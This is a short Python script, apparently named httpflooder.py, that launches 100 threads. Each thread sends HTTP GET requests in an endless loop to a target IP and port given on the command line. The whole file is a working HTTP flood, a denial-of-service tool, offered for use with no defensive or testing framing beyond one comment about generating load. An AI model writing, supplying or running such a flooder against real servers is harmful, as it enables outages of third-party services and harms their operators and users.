import requests
import threading
import sys

def flood(url, port):
    while True:
        try:
            response = requests.get(f"http://{url}:{port}")
            print(f"Request sent to {url}:{port} - Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")

def start_flood(target_ip, target_port, num_threads):
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=flood, args=(target_ip, target_port))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 httpflooder.py <IP> <PORT>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = sys.argv[2]

    num_threads = 100  # You can adjust this based on how much load you want to generate.
    start_flood(target_ip, target_port, num_threads)
